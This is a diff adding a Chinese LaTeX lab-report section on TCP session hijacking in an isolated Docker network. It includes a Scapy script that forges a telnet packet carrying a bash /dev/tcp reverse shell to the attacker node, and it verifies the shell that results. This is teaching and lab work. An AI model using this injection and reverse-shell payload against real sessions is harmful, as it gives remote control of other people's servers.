@@ -1,12 +1,99 @@
-\section{实验四：TCP 会话劫持}
-\subsection{实验目的}
-\todo{补充实验目的}
+\section{实验四：\texttt{TCP} 会话劫持}
 
-\subsection{实验环境与拓扑}
-\todo{补充实验环境与拓扑}
+\subsection{实验环境与网络拓扑}
 
-\subsection{实验过程}
-\todo{补充实验过程}
+本实验在 WSL2 的 Docker Compose 隔离网络中完成。User、Attacker 和 Victim Server 分别位于三个网段，路由器开启 IPv4 转发，并将 User 与 Victim Server 之间的流量镜像到 Attacker。各节点地址如表~\ref{tab:task4-network} 所示，拓扑如图~\ref{fig:task4-topology} 所示。
 
-\subsection{实验结果与分析}
-\todo{补充实验结果与分析}
+\begin{table}[H]
+    \centering
+    \caption{\texttt{TCP} 会话劫持实验的实际网络配置}
+    \label{tab:task4-network}
+    \renewcommand{\arraystretch}{1.2}
+    \begin{tabularx}{\linewidth}{l l l X}
+        \toprule
+        节点 & 网段侧 & IPv4 地址 & 默认路由 \\
+        \midrule
+        Attacker & 攻击者网段 & \texttt{192.168.2.100/24} & \texttt{192.168.2.10} \\
+        User & 用户网段 & \texttt{192.168.3.100/24} & \texttt{192.168.3.10} \\
+        Router & 攻击者侧 & \texttt{192.168.2.10/24} & -- \\
+        Router & 用户侧 & \texttt{192.168.3.10/24} & -- \\
+        Router & 服务器侧 & \texttt{192.168.4.10/24} & -- \\
+        Victim Server & 服务器网段 & \texttt{192.168.4.105/24} & \texttt{192.168.4.10} \\
+        \bottomrule
+    \end{tabularx}
+\end{table}
+
+\labfigure[0.88\linewidth]{figures/task4/topology.png}{\texttt{TCP} 会话劫持实验拓扑}{fig:task4-topology}
+
+\subsection{建立正常 \texttt{Telnet} 会话}
+
+首先在 User 上连接受害者服务器的 \texttt{Telnet} 服务并以实验账户 \texttt{lab} 登录：
+
+\begin{lstlisting}[language=bash,caption={User 登录 Victim Server 的 \texttt{Telnet} 服务}]
+telnet 192.168.4.105 23
+\end{lstlisting}
+
+登录成功后，User 获得服务器的交互式命令行。攻击前的终端结果见图~\ref{fig:task4-telnet}。
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[trim=720bp 0 0 0,clip,width=0.88\linewidth]{figures/task4/telnet_login(1).png}
+    \caption{攻击前，User 正常登录受害者服务器的 \texttt{Telnet} 会话}
+    \label{fig:task4-telnet}
+\end{figure}
+
+\subsection{监听会话并注入 \texttt{TCP} 数据}
+
+在 Attacker 上启动 \texttt{TCP} 端口 9999 的监听程序，再运行 Scapy 会话劫持脚本。脚本过滤从 \texttt{192.168.4.105:23} 发往 \texttt{192.168.3.100} 的 \texttt{Telnet} 流量；检测到服务器发来的、包含数据的 ACK 报文后，记录其 \texttt{TCP} 序列号、确认号及负载长度。为减少 \texttt{Telnet} 回显等连续报文造成的干扰，脚本等待服务器报文间隔 1.5 秒后再构造一个注入报文，最长等待时间为 60 秒。
+
+脚本将注入报文的源、目的 IP 与端口设置为原会话的反向方向，并设置 \texttt{PA} 标志。注入序列号取捕获报文的 ACK；注入确认号取捕获报文的序列号加负载长度，并按 32 位序号空间取值。核心代码如下：
+
+\begin{lstlisting}[language=Python,caption={根据捕获的 \texttt{Telnet} 报文构造一次 \texttt{TCP} 会话注入}]
+SPOOFED_PAYLOAD = (
+    b"\n/bin/bash -i > /dev/tcp/192.168.2.100/9999 "
+    b"0<&1 2>&1\n"
+)
+
+observed_tcp = packet[TCP]
+payload_length = len(bytes(packet[Raw].load))
+injected_seq = int(observed_tcp.ack)
+injected_ack = (
+    int(observed_tcp.seq) + payload_length
+) & 0xFFFFFFFF
+
+forged_packet = (
+    IP(src=USER_IP, dst=VICTIM_IP)
+    / TCP(
+        sport=int(observed_tcp.dport),
+        dport=int(observed_tcp.sport),
+        flags="PA",
+        seq=injected_seq,
+        ack=injected_ack,
+    )
+    / Raw(load=SPOOFED_PAYLOAD)
+)
+send(forged_packet, iface=INTERFACE, verbose=False)
+\end{lstlisting}
+
+运行期间，User 在已经建立的 \texttt{Telnet} 会话中输入 \texttt{pwd} 并回车，以产生新的 \texttt{TCP} 流量。Attacker 捕获服务器回显后，计算注入报文的序列号和确认号，并向受害者服务器发送包含反向连接命令的 \texttt{TCP} 数据。图~\ref{fig:task4-injection}记录了 Attacker 的监听器、捕获结果和注入状态。
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[trim=720bp 0 0 0,clip,width=0.88\linewidth]{figures/task4/injection(1).png}
+    \caption{Attacker 捕获 \texttt{Telnet} 报文并发送会话注入数据}
+    \label{fig:task4-injection}
+\end{figure}
+
+\subsection{反向连接与会话验证}
+
+注入成功后，Victim Server 主动连接 Attacker 的 9999 端口，Attacker 的 netcat 监听器显示收到来自受害者服务器的连接。随后在该会话中执行 \texttt{id}、\texttt{hostname}、\texttt{pwd} 和 \texttt{ifconfig}，结果分别表明当前身份为 \texttt{uid=1001(lab)}、主机名为 \texttt{server-1}、工作目录为 \texttt{/home/lab}，服务器接口地址为 \texttt{192.168.4.105}，如图~\ref{fig:task4-shell} 所示。
+
+因此，注入的数据确实由受害者服务器上的 \texttt{Telnet} 登录账户执行，并建立了从受害者服务器返回 Attacker 的交互式 Shell。该 Shell 权限为实验账户 \texttt{lab}，而非 root。
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[trim=720bp 387bp 0 0,clip,width=0.94\linewidth]{figures/task4/shell_verification(1).png}
+    \caption{反向连接后在受害者实验账户下核对身份、主机名和地址}
+    \label{fig:task4-shell}
+\end{figure}
+
